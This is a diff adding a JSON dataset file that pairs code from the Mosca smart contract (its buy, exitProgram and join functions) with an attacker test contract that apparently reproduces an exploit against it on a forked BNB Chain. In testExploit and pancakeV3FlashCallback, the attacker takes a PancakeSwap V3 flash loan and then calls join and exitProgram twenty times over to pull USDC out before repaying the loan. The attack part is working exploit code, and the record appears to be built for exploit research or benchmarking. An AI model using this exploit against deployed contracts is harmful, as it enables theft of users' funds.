@@ -1,0 +1,121 @@
+[
+  {
+    "contract/interface": "IMosca",
+    "source_type": "victim_contract",
+    "function_name": "buy",
+    "original_code": "     function buy(uint256 amount, bool buyFiat, uint8 fiat) external nonReentrant{\n        require(refByAddr[msg.sender] != 0, \"Cannot buy before activating citizenship\");\n           User storage user = users[msg.sender];\n\n        uint256 baseAmount = (amount * 1000)/1015;\n\n       \n        \n          \n        totalRevenue+= amount;\n        if(!buyFiat){\n             user.balance += baseAmount;\n             emit BoughtMosca(msg.sender,  block.timestamp, baseAmount);\n        } else {\n            if(fiat == 1) {\n                 user.balanceUSDT += baseAmount;\n                 emit BoughtUSDT(msg.sender,  block.timestamp, baseAmount);\n            } else {\n                user.balanceUSDC += baseAmount;\n                emit BoughtUSDC(msg.sender, block.timestamp, baseAmount);\n            } \n        }\n    \n\n         if(fiat == 1) {\n           require(usdt.transferFrom(msg.sender, address(this), amount), \"Transfer failed\"); \n            \n            } else {\n                require(usdc.transferFrom(msg.sender, address(this), amount), \"Transfer failed\");\n               \n\n            }\n\n\n        distributeFees(msg.sender, amount);\n        \n     }\n\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMosca",
+    "source_type": "victim_contract",
+    "function_name": "exitProgram",
+    "original_code": "   function exitProgram() external nonReentrant {\n    require(!isBlacklisted[msg.sender], \"Blacklisted user\");\n    User storage user = users[msg.sender];\n\n    address referrer = referrers[user.collectiveCode];\n    if (referrer != address(0) && users[referrer].inviteCount > 0) {\n        users[referrer].inviteCount--;\n    }\n\n    for (uint256 i = 0; i < rewardQueue.length; i++) {\n        address userAddr = rewardQueue[i];\n        if (userAddr == msg.sender) {\n            // Perform withdrawal before modifying user state\n            withdrawAll(msg.sender);\n\n            // Remove user from reward queue and reset state\n            refByAddr[userAddr] = 0;\n            referrers[user.refCode] = 0x000000000000000000000000000000000000dEaD;\n            user.balance = 0;\n            user.enterprise = false;\n\n            rewardQueue[i] = rewardQueue[rewardQueue.length - 1];\n            rewardQueue.pop();\n\n            emit ExitProgram(msg.sender, block.timestamp);\n        }\n    }\n}\n   \n    \n\n\n    \n\n    \n    \n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMosca",
+    "source_type": "victim_contract",
+    "function_name": "join",
+    "original_code": "     function join(uint256 amount, uint256 _refCode, uint8 fiat, bool enterpriseJoin) external nonReentrant{\n           User storage user = users[msg.sender];\n           uint256 diff = user.balance > 127 * 10 ** 18 ? user.balance - 127 * 10 ** 18 : 0;\n            uint256 tax_remainder;\n\n           uint256 baseAmount = ((amount + diff) * 1000) / 1015;\n          \n       \n\n      \n            if(enterpriseJoin) {\n                \n                if(refByAddr[msg.sender] == 0) {\n                    require(amount >= (ENTERPRISE_JOIN_FEE * 3) + (JOIN_FEE * 3), \"Insufficient amount sent to join enterprise\");\n                    if(fiat == 1){\n                    require(usdt.transferFrom(msg.sender, address(this), amount - (ENTERPRISE_TAX * 3)), \"Transfer failed\");\n                    require(usdt.transferFrom(msg.sender, owner, ENTERPRISE_TAX * 3), \"Transfer tax failed\");\n                    } else {\n                        require(usdc.transferFrom(msg.sender, address(this), amount - (ENTERPRISE_TAX * 3)), \"Transfer failed\");\n                        require(usdc.transferFrom(msg.sender, owner, ENTERPRISE_TAX * 3), \"Transfer tax failed\");\n                    }\n\n\n                } else {\n                    \n                    require(amount + diff >= (ENTERPRISE_JOIN_FEE * 3), \"Insufficient amount to upgrade to enterprise\");\n                    if(diff < ENTERPRISE_TAX * 3){\n                        tax_remainder = (ENTERPRISE_TAX * 3) - diff;\n                        adminBalance+= (ENTERPRISE_TAX * 3) - diff;\n                        user.balance -= diff;\n                        diff = 0;\n                        \n\n                         if(fiat == 1){\n                            require(usdt.transferFrom(msg.sender, owner, tax_remainder), \"Transfer failed\");\n                        } else {\n                            require(usdc.transferFrom(msg.sender, owner, tax_remainder), \"Transfer failed\");\n                        }\n\n                    } else {\n                        adminBalance+= ENTERPRISE_TAX * 3;\n                        diff -= ENTERPRISE_TAX * 3;\n                         user.balance -= ENTERPRISE_TAX * 3; \n                        if(diff > ENTERPRISE_JOIN_FEE * 3){\n                            user.balance -= (ENTERPRISE_JOIN_FEE * 3);\n                        } else {\n                            user.balance -= diff;\n                        }\n                       \n\n                    }\n\n                      if(amount > 0) {\n\n                        if(fiat == 1){\n\n                            require(usdt.transferFrom(msg.sender, address(this), amount - tax_remainder), \"Transfer failed\");\n\n                        } else {\n\n                            require(usdc.transferFrom(msg.sender, address(this), amount - tax_remainder), \"Transfer failed\");\n\n                        }\n\n\n                        }\n                    \n                    \n\n                  \n\n                }\n                user.enterprise = true;\n            } else {\n\n                require(amount >= JOIN_FEE, \"Insufficient amount sent\");\n\n\n                if(fiat == 1){\n\n                    require(usdt.transferFrom(msg.sender, address(this), amount - (TAX * 3)), \"Transfer failed\");\n                    require(usdt.transferFrom(msg.sender, owner, TAX * 3), \"Transfer failed\");\n                } else {\n\n                     require(usdc.transferFrom(msg.sender, address(this), amount - (TAX * 3)), \"Transfer failed\");\n                    require(usdc.transferFrom(msg.sender, owner, TAX * 3), \"Transfer failed\");\n\n                }\n\n\n            }\n        \n        \n      \n       user.nextDeadline = block.timestamp + 28 days;\n       user.bonusDeadline = block.timestamp + 7 days;\n       user.walletAddress = msg.sender;\n        totalRevenue+= amount;\n        user.balance += enterpriseJoin ? baseAmount - ENTERPRISE_JOIN_FEE : baseAmount - JOIN_FEE;\n\n     \n\n        if(referrers[_refCode] != address(0)){\n            user.collectiveCode = _refCode;\n            users[referrers[user.collectiveCode]].balance += enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100);\n            users[referrers[user.collectiveCode]].inviteCount++;\n            emit RewardEarned(referrers[user.collectiveCode], block.timestamp, enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100));\n            if(users[referrers[user.collectiveCode]].inviteCount % 3 == 0){\n                users[referrers[user.collectiveCode]].balance += enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100);\n                emit RewardEarned(referrers[user.collectiveCode], block.timestamp, enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100));\n            }\n\n        }\n\n        rewardQueue.push(msg.sender);\n\n        if(refByAddr[msg.sender] == 0){\n        generateRefCode(msg.sender);\n        }\n\n        emit Joined(msg.sender, block.timestamp, amount, fiat);\n\n       cascade(msg.sender);\n\n        distributeFees(msg.sender, amount);\n        \n     }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Mosca",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Mosca",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Mosca",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Mosca",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Mosca",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Mosca",
+    "source_type": "attacker_contract",
+    "function_name": "pancakeV3FlashCallback",
+    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory data) external {\n        (uint256 amount) = abi.decode(data, (uint256));\n        IMosca(MOSCA).buy(amount, true, 2);\n        IMosca(MOSCA).exitProgram();\n        \n        uint256 joinAmount = 30_000_000_000_000_000_000;\n        \n        for(uint256 i=0;i<20;i++) {\n            IMosca(MOSCA).join(joinAmount, 0, 2, false);\n            IMosca(MOSCA).exitProgram();\n        }\n\n        IERC20(USDC).transfer(msg.sender, amount+fee1);\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Mosca",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", blocknumToForkFrom);\n        deal(USDC, address(this), 30_000_000_000_000_000_000);\n        fundingToken = address(USDC);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Mosca",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Mosca",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Mosca",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Mosca",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Mosca",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Mosca",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Mosca",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public balanceLog {\n        IERC20(USDC).approve(MOSCA, type(uint256).max);\n\n        uint256 amount = 30_000_000_000_000_000_000;\n        uint256 refCode = 0;\n        uint8 fiat = 2;\n        bool enterpriseJoin = false;\n        IMosca(MOSCA).join(amount, refCode, fiat, enterpriseJoin);\n\n        address recipient = address(this);\n        uint256 amount0 = 0;\n        uint256 amount1 = 1_000_000_000_000_000_000_000;\n        bytes memory data = abi.encode(amount1);\n        IPancakeV3Pool(PancakePool).flash(recipient, amount0, amount1, data);\n    }\n\n",
+    "description": ""
+  }
+]
